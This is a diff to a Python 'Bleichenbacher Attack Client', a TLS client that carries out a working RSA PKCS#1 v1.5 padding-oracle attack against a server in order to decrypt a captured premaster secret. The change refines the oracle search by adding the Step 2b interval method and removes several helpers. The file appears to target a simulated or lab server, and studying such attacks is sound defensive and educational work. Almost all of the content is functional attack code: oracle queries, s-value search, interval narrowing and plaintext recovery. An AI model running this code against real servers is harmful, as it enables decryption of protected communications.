@@ -4,15 +4,14 @@ Bleichenbacher Attack Client
 Implements a TLS client with Bleichenbacher padding oracle attack capabilities.
 """
 
-from typing import Any, Dict, Optional, List, Tuple
-import os
 import sys
 import time
-import requests
 from datetime import datetime
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization
+from typing import Any, Dict, List, Optional, Tuple
+
+import requests
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
 
 
 class BleichenbacherClient:
@@ -107,9 +106,6 @@ class BleichenbacherClient:
         Returns:
             Server acknowledgment
         """
-        if encrypted_pms is None:
-            encrypted_pms = self._encrypt_premaster_secret()
-
         payload = {
             "encrypted_premaster_secret": encrypted_pms.hex()
         }
@@ -118,61 +114,32 @@ class BleichenbacherClient:
         return response.json()
 
     # Bleichenbacher Attack Methods
-    def execute_bleichenbacher_attack(self, target_ciphertext: bytes) -> Optional[bytes]:
+    def execute_bleichenbacher_attack(self, ciphertext: bytes) -> Optional[bytes]:
         """
         Execute Bleichenbacher padding oracle attack to decrypt ciphertext.
 
         The attack works by:
-        1. Check if captured ciphertext is PKCS-conforming (it should be)
-        2. Oracle queries: Send modified ciphertexts to check padding validity
-        3. Narrowing intervals: Use oracle responses to narrow plaintext range
-        4. Recovery: Iteratively recover plaintext message
+        1. Oracle queries: Send modified ciphertexts to check padding validity
+        2. Narrowing intervals: Use oracle responses to narrow plaintext range
+        3. Recovery: Iteratively recover plaintext message
 
         Args:
-            target_ciphertext: The encrypted premaster secret to decrypt
+            ciphertext: The encrypted premaster secret to decrypt
 
         Returns:
             Decrypted plaintext if successful, None otherwise
         """
-        print("[*] Starting Bleichenbacher attack...")
-
-        # For a captured ciphertext, we know it's already PKCS#1 v1.5 conforming
-        # because the server created it with valid padding
-        print("[*] Verifying captured ciphertext is PKCS-conforming...")
-        if not self.padding_oracle_query(target_ciphertext):
-            print("[-] Error: Captured ciphertext is not PKCS-conforming!")
-            return None
-
-        print("[+] Ciphertext is PKCS-conforming, starting attack...")
-        print("[*] Beginning full-scale Bleichenbacher attack...\n")
+        print(
+            f"[*] Starting Bleichenbacher attack w/ {self.cipher_suite} cipher suite")
 
         # Start the full attack
-        plaintext = self._narrow_solution_space(target_ciphertext, s0=1)
-
-        return plaintext
-
-    def _blind_ciphertext(self, ciphertext: bytes) -> bytes:
-        """
-        Blind the ciphertext to prevent detection.
-
-        Multiply ciphertext by r^e mod n where r is random.
-
-        Args:
-            ciphertext: Original ciphertext
-
-        Returns:
-            Blinded ciphertext
-        """
-        # For demonstration, return the original ciphertext
-        # In a real attack, you would multiply by r^e mod n
-        # where r is a random blinding factor
-        return ciphertext
+        return self._narrow_solution_space(ciphertext, s0=1)
 
     def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int, iteration: int, start_time: float, oracle_queries: int, log_file) -> Tuple[Optional[int], int]:
         """
         Find the next s value that produces PKCS#1 v1.5 conformant message.
 
-        Implements Bleichenbacher Step 2.c: searching with more than one interval.
+        Implements Bleichenbacher Step 2b (single interval) and 2c (multiple intervals).
 
         Args:
             c: Ciphertext as integer
@@ -190,60 +157,93 @@ class BleichenbacherClient:
         Returns:
             Tuple of (next s value or None, number of queries used)
         """
-        # Start searching from s_prev + 1
-        s = s_prev + 1
         queries_used = 0
 
-        # Search indefinitely until we find a conforming value
-        while True:
-            queries_used += 1
-            total_queries = oracle_queries + queries_used
+        # Step 2b: Searching with one interval (more efficient)
+        if len(M) == 1:
+            a, b = M[0]
+            # Calculate a better starting point based on the interval
+            r = (2 * (b * s_prev - 2 * B) + n - 1) // n  # ceiling division
 
-            # Update progress every 10 queries to avoid excessive output
-            if queries_used % 10 == 0:
-                elapsed = time.time() - start_time
-                qps = total_queries / elapsed if elapsed > 0 else 0
-                # Show interval width if single interval
-                if len(M) == 1:
-                    width = M[0][1] - M[0][0]
-                    width_bits = width.bit_length()
-                    sys.stdout.write(
-                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Searching s={s}...")
-                else:
+            while True:
+                # Calculate s range for this r
+                s_min = (2 * B + r * n + b - 1) // b  # ceiling division
+                s_max = (3 * B - 1 + r * n) // a  # floor division
+
+                # Search through this range
+                for s in range(max(s_min, s_prev + 1), s_max + 1):
+                    queries_used += 1
+                    total_queries = oracle_queries + queries_used
+
+                    # Update progress every 10 queries
+                    if queries_used % 10 == 0:
+                        elapsed = time.time() - start_time
+                        qps = total_queries / elapsed if elapsed > 0 else 0
+                        width = b - a
+                        width_bits = width.bit_length()
+                        sys.stdout.write(
+                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | r={r}, s={s}...")
+                        sys.stdout.flush()
+
+                    # Test if this s value produces conforming message
+                    if self._test_s_value(c, s, e, n, k):
+                        elapsed = time.time() - start_time
+                        qps = total_queries / elapsed if elapsed > 0 else 0
+                        width = b - a
+                        width_bits = width.bit_length()
+
+                        # Log the found s value
+                        log_msg = f"Iteration {iteration}: Found s = {s} (r = {r}) | Queries so far: {total_queries} | Rate: {qps:.1f} q/s | Elapsed: {int(elapsed)}s | Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                        log_file.write(log_msg)
+                        log_file.flush()
+
+                        sys.stdout.write(
+                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Found s={s} (r={r})!    \n")
+                        sys.stdout.flush()
+                        return s, queries_used
+
+                # Move to next r value
+                r += 1
+
+        # Step 2c: Searching with multiple intervals (original linear search)
+        else:
+            s = s_prev + 1
+
+            while True:
+                queries_used += 1
+                total_queries = oracle_queries + queries_used
+
+                # Update progress every 10 queries
+                if queries_used % 10 == 0:
+                    elapsed = time.time() - start_time
+                    qps = total_queries / elapsed if elapsed > 0 else 0
                     sys.stdout.write(
                         f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Searching s={s}...")
-                sys.stdout.flush()
+                    sys.stdout.flush()
 
-            # Test if this s value produces conforming message
-            if self._test_s_value(c, s, e, n, k):
-                # Found conforming value, print on new line
-                elapsed = time.time() - start_time
-                qps = total_queries / elapsed if elapsed > 0 else 0
+                # Test if this s value produces conforming message
+                if self._test_s_value(c, s, e, n, k):
+                    elapsed = time.time() - start_time
+                    qps = total_queries / elapsed if elapsed > 0 else 0
 
-                # Log the found s value
-                log_msg = f"Iteration {iteration}: Found s = {s} | Queries so far: {total_queries} | Rate: {qps:.1f} q/s | Elapsed: {int(elapsed)}s | Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                log_file.write(log_msg)
-                log_file.flush()
+                    # Log the found s value
+                    log_msg = f"Iteration {iteration}: Found s = {s} | Queries so far: {total_queries} | Rate: {qps:.1f} q/s | Elapsed: {int(elapsed)}s | Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                    log_file.write(log_msg)
+                    log_file.flush()
 
-                # Show interval info if single interval
-                if len(M) == 1:
-                    width = M[0][1] - M[0][0]
-                    width_bits = width.bit_length()
-                    sys.stdout.write(
-                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
-                else:
                     sys.stdout.write(
                         f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
-                sys.stdout.flush()
-                return s, queries_used
-            s += 1
+                    sys.stdout.flush()
+                    return s, queries_used
+
+                s += 1
 
     def _narrow_solution_space(self, ciphertext: bytes, s0: int) -> Optional[bytes]:
         """
         Iteratively narrow the solution space using oracle queries.
 
         Args:
-            ciphertext: Blinded ciphertext
+            ciphertext: Ciphertext
             s0: Initial s value
 
         Returns:
@@ -254,7 +254,7 @@ class BleichenbacherClient:
         n = public_numbers.n
         e = public_numbers.e
         k = (n.bit_length() + 7) // 8
-        B = 2 ** (8 * (k - 2))
+        B = 2 ** (8 * (k - 2))          # Boundary value
 
         # Convert ciphertext to integer
         c = int.from_bytes(ciphertext, byteorder='big')
@@ -266,7 +266,7 @@ class BleichenbacherClient:
 
         # Use a single log file for all attacks
         log_filename = "bleichenbacher_attack.log"
-        log_file = open(log_filename, 'a')  # Append mode
+        log_file = open(log_filename, 'a', encoding='utf-8')  # Append mode
         log_file.write(f"\n{'='*80}\n")
         log_file.write("NEW ATTACK SESSION\n")
         log_file.write(
@@ -359,7 +359,7 @@ class BleichenbacherClient:
 
                     # Log success
                     log_file.write(f"\n{'='*80}\n")
-                    log_file.write(f"ATTACK SUCCESSFUL!\n")
+                    log_file.write("ATTACK SUCCESSFUL!\n")
                     log_file.write(f"Total Iterations: {iteration}\n")
                     log_file.write(f"Total Oracle Queries: {oracle_queries}\n")
                     log_file.write(
@@ -489,47 +489,6 @@ class BleichenbacherClient:
             return status == 'client_key_exchange_received'
         return False
 
-    def _encrypt_premaster_secret(self) -> bytes:
-        """
-        Generate and encrypt premaster secret using RSA PKCS#1 v1.5.
-
-        Returns:
-            Encrypted premaster secret
-        """
-        # Generate 48-byte premaster secret (TLS 1.2 version + 46 random bytes)
-        # TLS version 0x0303 = TLS 1.2
-        premaster_secret = b'\x03\x03' + os.urandom(46)
-        self.premaster_secret = premaster_secret
-
-        # Encrypt with server's public key using PKCS#1 v1.5 padding
-        encrypted = self.server_public_key.encrypt(
-            premaster_secret,
-            padding.PKCS1v15()
-        )
-        return encrypted
-
-    def generate_malformed_ciphertexts(self, ciphertext: bytes, multiplier: int) -> bytes:
-        """
-        Generate malformed ciphertext for oracle query.
-
-        Args:
-            ciphertext: Original ciphertext
-            multiplier: Value to multiply with original ciphertext
-
-        Returns:
-            Malformed ciphertext
-        """
-        # c' = (c * multiplier^e) mod n
-        public_numbers = self.server_public_key.public_numbers()
-        n = public_numbers.n
-        e = public_numbers.e
-        k = (n.bit_length() + 7) // 8
-
-        c = int.from_bytes(ciphertext, byteorder='big')
-        c_prime = (c * pow(multiplier, e, n)) % n
-
-        return c_prime.to_bytes(k, byteorder='big')
-
     def health_check(self) -> bool:
         """
         Check if server is reachable and responding.
@@ -557,10 +516,11 @@ if __name__ == "__main__":
         if client.perform_handshake():
             print("[+] Handshake successful")
             target_ciphertext = client.simulate_captured_message()
-            plaintext = client.execute_bleichenbacher_attack(target_ciphertext)
-            if plaintext:
+            decrypted_plaintext = client.execute_bleichenbacher_attack(
+                target_ciphertext)
+            if decrypted_plaintext:
                 print(
-                    f"[+] Attack successful! Recovered plaintext: {plaintext}")
+                    f"[+] Attack successful! Recovered plaintext: {decrypted_plaintext}")
             else:
                 print("[-] Attack failed to recover plaintext")
         else:
